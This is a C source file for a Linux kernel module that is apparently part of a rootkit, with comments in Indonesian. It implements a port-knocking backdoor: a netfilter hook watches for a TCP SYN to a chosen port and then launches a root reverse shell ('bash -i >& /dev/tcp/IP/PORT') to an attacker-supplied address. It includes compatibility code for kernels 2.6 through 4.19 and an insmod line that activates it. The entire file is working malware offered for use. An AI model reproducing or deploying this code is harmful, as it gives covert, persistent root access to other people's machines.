/*
 * backdoor.c (legacy) — port-knock -> reverse shell (OPT-IN).
 *
 * Sama dengan modern, dengan2 penyesuaian era:
 *   - signature hook netfilter berubah di2.6.36 (nf_hook_state baru)
 *   - nf_register_net_hook baru di4.13 (sebelumnya nf_register_hook)
 *   - keduanya ditangani #if agar aman dari2.6 s/d4.19
 *
 * Aktivasi (saat insmod):
 *   insmod rkit4x.ko backdoor_ip=<ip-kamu> backdoor_port=4444 knock_port=1337
 * Tanpa backdoor_ip = fitur NONAKTIF total.
 *
 * Alur: TCP SYN ke knock_port -> hook LOCAL_IN -> workqueue ->
 *       call_usermodehelper: bash -i >& /dev/tcp/IP/PORT0>&1
 */
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/version.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/net_namespace.h>   /* init_net (untuk >=4.13) */
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/jiffies.h>
#include <linux/workqueue.h>
#include <linux/kmod.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/printk.h>
#include "kver.h"
#include "l4x.h"

static char *backdoor_ip;
static unsigned int backdoor_port = 4444;
static unsigned int knock_port = 1337;
module_param(backdoor_ip,   charp, 0000);
module_param(backdoor_port, uint,  0000);
module_param(knock_port,    uint,  0000);

static struct work_struct g_fire_ws;
static unsigned long g_last_fire;
static bool g_hook_registered;

static void fire_worker(struct work_struct *ws)
{
	char cmd[160];
	char *argv[4];
	char *envp[] = { "HOME=/", "PATH=/usr/bin:/bin", NULL };

	(void)ws;
	if (!backdoor_ip || !backdoor_ip[0])
		return;
	snprintf(cmd, sizeof(cmd), "bash -i >& /dev/tcp/%s/%u 0>&1",
		 backdoor_ip, backdoor_port);
	argv[0] = "/bin/bash";
	argv[1] = "-c";
	argv[2] = cmd;
	argv[3] = NULL;
	if (call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC))
		pr_warn("l4x: backdoor gagal dijalankan\n");
	else
		pr_info("l4x: backdoor dipecat ke %s:%u\n", backdoor_ip, backdoor_port);
}

/* badan bersama kedua signature hook */
static unsigned int knock_common(struct sk_buff *skb)
{
	struct iphdr *iph;
	struct tcphdr *th;

	if (!backdoor_ip || !backdoor_ip[0])
		return NF_ACCEPT;
	if (!pskb_may_pull(skb, sizeof(struct iphdr) + sizeof(struct tcphdr)))
		return NF_ACCEPT;
	iph = ip_hdr(skb);
	if (iph->protocol != IPPROTO_TCP)
		return NF_ACCEPT;
	th = (struct tcphdr *)((char *)iph + iph->ihl * 4);
	if (!th->syn || th->ack)
		return NF_ACCEPT;
	if (ntohs(th->dest) != knock_port)
		return NF_ACCEPT;
	if (time_before(jiffies, g_last_fire + 5 * HZ))
		return NF_ACCEPT;
	g_last_fire = jiffies;
	schedule_work(&g_fire_ws);
	return NF_ACCEPT;
}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,36,0)
/* ---- signature modern: nf_hook_state ---- */
static unsigned int knock_hook(void *priv, struct sk_buff *skb,
			       const struct nf_hook_state *state)
{
	(void)priv;
	(void)state;
	return knock_common(skb);
}
#else
/* ---- signature pra-2.6.36:5 argumen ---- */
static unsigned int knock_hook(unsigned int hooknum, struct sk_buff *skb,
			       struct net_device *in,
			       struct net_device *out,
			       int (*okfn)(struct sk_buff *))
{
	(void)hooknum;
	(void)in;
	(void)out;
	(void)okfn;
	return knock_common(skb);
}
#endif

static struct nf_hook_ops g_ops = {
	.hook     = knock_hook,
	.pf       = AF_INET,
	.hooknum  = NF_INET_LOCAL_IN,
	.priority = NF_IP_PRI_FIRST,
};

int l4x_backdoor_init(void)
{
	int ret;

	INIT_WORK(&g_fire_ws, fire_worker);
	if (!backdoor_ip || !backdoor_ip[0])
		return 0;              /* nonaktif = bukan kegagalan */

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	ret = nf_register_net_hook(&init_net, &g_ops);
#else
	ret = nf_register_hook(&g_ops);
#endif
	if (ret) {
		pr_warn("l4x: backdoor: daftar hook gagal (%d)\n", ret);
		return ret;
	}
	g_hook_registered = true;
	pr_info("l4x: backdoor AKTIF — knock TCP %u -> %s:%u\n",
		knock_port, backdoor_ip, backdoor_port);
	return 0;
}

void l4x_backdoor_exit(void)
{
	if (g_hook_registered) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
		nf_unregister_net_hook(&init_net, &g_ops);
#else
		nf_unregister_hook(&g_ops);
#endif
		g_hook_registered = false;
	}
	cancel_work_sync(&g_fire_ws);
}
